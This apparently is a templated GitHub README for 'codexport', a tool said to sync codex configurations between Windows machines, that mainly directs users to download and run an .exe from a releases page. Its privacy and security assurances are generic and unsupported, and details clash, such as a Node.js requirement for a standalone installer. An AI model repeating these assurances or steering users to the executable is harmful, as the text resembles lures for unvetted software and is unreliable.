# ⚙️ codexport - Keep your codex setup perfectly synced

[![](https://img.shields.io/badge/Download_Codexport-blue)](https://github.com/indiscernible-stringofwords49/codexport/releases)

Codexport manages your codex configurations across multiple machines. You maintain one master setup and this tool copies those settings to your other devices. It saves time and prevents configuration errors when you work on different computers.

## 📥 How to download the software

Follow these steps to get the software on your Windows computer.

1. Visit the [official releases page](https://github.com/indiscernible-stringofwords49/codexport/releases).
2. Look for the latest release at the top of the list.
3. Click the file ending in `.exe` to start the download.
4. Save the file to a folder you can find later, such as your Downloads folder.

## 🖥️ System requirements

Ensure your computer meets these basic needs before you begin:

* Windows 10 or Windows 11.
* A stable internet connection.
* At least 50 megabytes of free disk space.
* Node.js installed on your machine.

## 🚀 Setting up the application

After you download the file, follow this process to use the tool.

1. Open the folder where you saved the `.exe` file.
2. Double-click the file to launch the setup wizard.
3. Follow the prompts on the screen to finish the installation.
4. Open your command prompt by clicking the Start button and typing cmd.
5. Type `codexport --help` to confirm the installation works.

## 🔗 Syncing your machines

The software uses a master and follower model. You choose one primary machine to act as the source of truth for your configuration files.

### Preparing the master machine

1. Open the command prompt.
2. Navigate to the folder containing your codex configuration files.
3. Run the command `codexport init`.
4. This action creates a connection point for your other devices to follow.

### Adding follower machines

1. Go to your second computer.
2. Install codexport using the same steps as the master machine.
3. Open the command prompt on the secondary device.
4. Run the command `codexport join` followed by the network address of your master machine.
5. The software now mirrors the settings from your master machine to this device.

## 🛡️ Using networking tools

Codexport works best when your machines reside on the same network. If you move between locations, consider using a virtual private network software like Tailscale. This creates a secure tunnel between your computers regardless of where you physically locate them. Install Tailscale on the master and every follower machine to maintain the sync status without manual intervention.

## 🛠️ Troubleshooting common issues

If the sync fails, check these items first.

* Permissions: Ensure your user account holds rights to read and write files in the configuration folder.
* Network status: Confirm both machines show as online within your network software.
* Command syntax: Recheck the command spelling. The application prints error messages if it finds a typo.

## 💡 Managing your configuration

You can update your codex setup whenever you need a change. Edit the files on your master machine first. Codexport detects these changes and pushes the updates to all connected follower machines within sixty seconds. You do not need to restart the application to trigger a sync.

## 📝 Configuration settings

The tool creates a small file called `config.json` inside your user directory. You can edit this file to change the sync frequency or to exclude specific folders from the automated process. Keep this file in a safe location as it stores the link between your machines. If you lose this file, you must reset the link between your systems.

## 🔑 Security and privacy

Codexport keeps all your configuration files within your own private network. The software does not upload your information to a public server. All data transfers occur between the machines you authorize. This ensures that your private codex setup remains on your local network.

## 📁 Organizing your codex files

Structure your master machine files logically to get the best results. Group your skills and tools into separate folders. Codexport preserves this folder structure on all follower machines. If you move a file on the master machine, the follower machines mirror that move during the next sync cycle.

## 🔄 Updating the software

Check the release page occasionally for updates. When a new version arrives, download the installer and run it over your existing version. The installer preserves your settings and configurations automatically. You do not need to reassign your machines after an update.

## 📄 Support and feedback

If you encounter bugs, report them through the issues tab on the project page. Provide your version number and a description of the problem. Maintain clear steps to reproduce the issue so developers can find a fix. Ensure you follow the project guidelines when you file a report.